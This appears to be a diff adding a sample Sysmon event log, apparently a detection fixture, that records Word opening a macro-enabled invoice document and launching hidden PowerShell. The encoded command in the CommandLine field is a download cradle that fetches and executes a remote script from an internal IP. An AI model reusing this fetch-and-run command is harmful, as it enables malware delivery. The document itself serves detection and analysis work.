@@ -1,0 +1,43 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-07-21T14:12:38.207665Z" />
+    <EventRecordID>184501</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="3128" ThreadID="4820" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION-07.corp.example.com</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+    <Data Name="UtcTime">2026-07-21 14:12:38.203</Data>
+    <Data Name="ProcessGuid">{a1b2c3d4-2256-64bf-3a00-000000005e00}</Data>
+    <Data Name="ProcessId">10236</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1682 (WinBuild.160101.0800)</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft&#xAE; Windows&#xAE; Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgAwADAALwBhAC4AcABzADEAJwApAA==</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">CORP\jsmith</Data>
+    <Data Name="LogonGuid">{a1b2c3d4-1e90-64bf-4b2a-020000000000}</Data>
+    <Data Name="LogonId">0x22a4b</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="Hashes">SHA256=9F1C7A5B3E2D4C6A8B0D1E2F3A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D,MD5=C3A4B5C6D7E8F90A1B2C3D4E5F607182</Data>
+    <Data Name="ParentProcessGuid">{a1b2c3d4-2240-64bf-3600-000000005e00}</Data>
+    <Data Name="ParentProcessId">5980</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jsmith\Downloads\Invoice_July2026.docm"</Data>
+    <Data Name="ParentUser">CORP\jsmith</Data>
+  </EventData>
+</Event>
